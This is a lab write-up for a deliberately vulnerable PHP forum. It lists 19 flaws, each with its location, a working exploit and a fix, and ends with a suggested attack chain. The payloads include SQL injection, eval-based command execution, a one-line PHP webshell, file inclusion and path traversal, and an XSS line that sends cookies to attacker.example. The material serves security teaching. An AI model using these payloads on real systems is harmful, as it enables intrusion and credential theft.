# VulnForum — Vulnerability Writeup

Lab use only. Each entry: **what → where → exploit → fix.**

---

## 1. SQL Injection — Login bypass
**Where:** `includes/auth.php` → `attempt_login()`
**Exploit:** Username `admin' -- ` with any password.
**Fix:** Prepared statements via `mysqli::prepare()`/bound params, never string concatenation.

---

## 2. SQL Injection — Thread view, search, reply, registration, reset
**Where:** `pages/thread.php`, `pages/search.php`, `pages/reply.php`, `pages/register.php`, `pages/reset_password.php`, `legacy_check.php`
**Exploit (search, UNION exfil):**
```
/?page=pages/search&q=x' UNION SELECT id,1,username,password,role,NULL,reset_token,NULL FROM users --
```
**Fix:** Parameterize everywhere. `addslashes()` (used in a couple of these as a half-measure) is not a substitute for prepared statements — it doesn't fully protect against all encodings/contexts.

---

## 3. PHP Type-Juggling Auth Bypass
**Where:** `includes/auth.php` → `legacy_password_ok()`, used by `legacy_check.php`
**Bug:** Compares hashes with `==` instead of `===`. PHP coerces certain
hex-digit strings (shaped like `"0e123..."`) to the float `0`, so two
different hashes that both have that shape are treated as equal.
**Exploit:** Find or craft an MD5 "magic hash" input and submit it as `hash`
against any account whose stored hash also happens to collide under loose
comparison — authenticates without the real password.
**Fix:** Always use `===` (or `hash_equals()`) for comparing hashes/tokens.

---

## 4. PHP Object Injection — `unserialize()` on the "remember me" cookie
**Where:** `includes/auth.php` → `try_remember_me()` / `set_remember_me()`
**Bug:** Cookie value is `serialize()`d with no signature, and `unserialize()`d
on every request with no `allowed_classes` restriction.
**Exploit:** As written, the cookie logs the holder in with no password check
just by setting `remember` to a serialized array naming any username — a
direct auth bypass on its own. Beyond that, if any loaded class in the
codebase has an exploitable `__wakeup()`/`__destruct()`, a crafted serialized
object (a "POP gadget chain") achieves remote code execution purely from
unserializing attacker data.
**Fix:** Never unserialize untrusted input — use JSON. If you must keep PHP
serialization, pass `['allowed_classes' => false]` and sign the cookie (HMAC)
so tampering invalidates it.

---

## 5. Mass Assignment → Privilege Escalation
**Where:** `pages/register.php`
**Exploit:**
```bash
curl -X POST http://localhost:8082/index.php?page=pages/register \
  -d "username=h4x&email=h@x.com&password=pw&role=admin"
```
**Fix:** Never read `role` from client input on self-registration.

---

## 6. Broken Access Control — Trusting the session role everywhere
**Where:** `includes/auth.php` → `require_admin()`, used by `admin/users.php`, `admin/eval.php`
**Bug:** Not independently broken, but it compounds #3 and #4 — any bypass
that lets you set `$_SESSION['user']['role'] = 'admin'` (or load an
admin-owned row via the unserialize bug) grants full admin panel access,
including the `eval()` tool below.
**Fix:** Re-verify role against the DB for sensitive actions rather than
trusting a long-lived session value alone; regenerate sessions on privilege changes.

---

## 7. `eval()` on user input — direct RCE
**Where:** `admin/eval.php`
**Exploit:** Submit `system('id');` (or `system('cat /var/www/html/config.php');`) in the "template preview" box.
**Fix:** Never `eval()` user input, period. There's no safe sandboxing of arbitrary PHP via `eval()`.

---

## 8. Local File Inclusion (LFI) / source disclosure
**Where:** `index.php` → `?page=` router
**Exploit:**
```
/?page=php://filter/convert.base64-encode/resource=config
```
Base64-decode the response to read `config.php`'s source, including the
hardcoded DB password. If `allow_url_include` were ever enabled, this
upgrades to full Remote File Inclusion (RFI) via an attacker-hosted URL.
**Fix:** Allow-list exact page names (`in_array($page, $allowed)`), never
build an `include()` path from raw user input.

---

## 9. Arbitrary File Upload = direct Remote Code Execution
**Where:** `pages/profile.php` (avatar upload)
**Bug:** No extension allow-list; files saved into the public, PHP-executing webroot.
**Exploit:** Upload a file named `shell.php` containing:
```php
<?php system($_GET['c']); ?>
```
then visit `/uploads/shell.php?c=id` — the server runs your command.
**Fix:** Allow-list extensions, store uploads outside the webroot (or in a
directory with PHP execution disabled via `<Directory>`/`.htaccess`
`php_admin_flag engine off`), rename to random server-generated filenames.

---

## 10. Path Traversal — File download
**Where:** `file.php?name=`
**Exploit:** `/file.php?name=../../../../../../etc/passwd`
**Fix:** `realpath()` the result and verify it's still inside the intended directory before reading.

---

## 11. Predictable, leaked password-reset tokens
**Where:** `pages/forgot_password.php`
**Bug:** 4-digit token from `rand()` (not `random_int()`), returned directly in the HTTP response.
**Fix:** `random_int()`/`bin2hex(random_bytes())` for the token, only ever email it, expire it quickly, rate-limit attempts on `reset_password.php`.

---

## 12. Session Fixation
**Where:** `includes/auth.php` → `attempt_login()` (no `session_regenerate_id()`), plus `session.use_strict_mode = 0` set in `apache/Dockerfile`.
**Exploit:** Attacker sets a victim's `PHPSESSID` in advance (e.g. by sending them a link containing it, since strict mode is off and the server will happily accept a client-supplied session ID); once the victim logs in, the attacker's known session ID is now authenticated.
**Fix:** `session_regenerate_id(true)` immediately after successful login; `session.use_strict_mode = 1`.

---

## 13. Stored XSS — Thread bodies & replies
**Where:** `pages/thread.php` renders `$t['body']` / `$r['body']` without `htmlspecialchars()`.
**Exploit:** Post a thread/reply body: `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">`
**Fix:** `htmlspecialchars($body, ENT_QUOTES)` on output, or sanitize on write with a library like HTML Purifier if any HTML must be allowed.

---

## 14. Reflected XSS — Search page
**Where:** `pages/search.php` echoes `$q` without escaping.
**Exploit:** `/?page=pages/search&q=<img src=x onerror=alert(document.cookie)>`
**Fix:** `htmlspecialchars($q)` wherever it's echoed.

---

## 15. Sensitive Data Exposure — Admin users page
**Where:** `admin/users.php`
**Bug:** Dumps password hashes and reset tokens into the rendered HTML.
**Fix:** Don't display raw hashes/tokens anywhere, ever — not even to admins.

---

## 16. Verbose errors leaked to the browser
**Where:** `config.php` (`display_errors=1` app-wide), `includes/db.php` (`die()` with DB error + full query text on every failure)
**Fix:** `display_errors=Off` in production; log errors server-side only; generic user-facing error messages.

---

## 17. No CSRF protection anywhere
**Where:** Every state-changing form (`login.php`, `new_thread.php`, `reply.php`, `profile.php`, `admin/eval.php`...) — all rely solely on the PHP session cookie with no CSRF token.
**Fix:** Generate a per-session CSRF token, embed it as a hidden field, verify it server-side on every POST.

---

## 18. Hardcoded secrets in a webroot-reachable file
**Where:** `config.php` (DB password, `APP_SECRET`)
**Fix:** Load secrets from environment variables / a vault, keep them out of version control, and ideally out of the webroot entirely.

---

## 19. Apache/PHP misconfiguration bundle
**Where:** `apache/Dockerfile`, `apache/apache-vhost.conf`
- `Options Indexes` → directory listing everywhere, including `/uploads`
- `/server-status` exposed with `Require all granted`
- `TraceEnable On` → Cross-Site Tracing
- `ServerTokens Full` / `ServerSignature On` → version fingerprinting
- `expose_php = On` → `X-Powered-By: PHP/8.2.x` header on every response
- No security headers configured anywhere (CSP, X-Frame-Options, HSTS, X-Content-Type-Options)
**Fix:** `Options -Indexes`, remove/restrict `/server-status`, `TraceEnable Off`, `ServerTokens Prod`, `ServerSignature Off`, `expose_php = Off`, add headers via `mod_headers`.

---

## Suggested chained attack
1. **LFI via `php://filter` (#8)** to read `config.php` source and confirm the DB password (not strictly needed, but confirms the stack).
2. **SQLi login bypass (#1)** straight into the real `admin` account — or chain **mass assignment (#5)** to self-register as admin instead.
3. From the admin panel, **`eval()` (#7)** gives an immediate shell: `system('id');`.
4. Alternatively, skip the panel entirely: **arbitrary file upload (#9)** drops a PHP webshell directly, no admin access required at all.
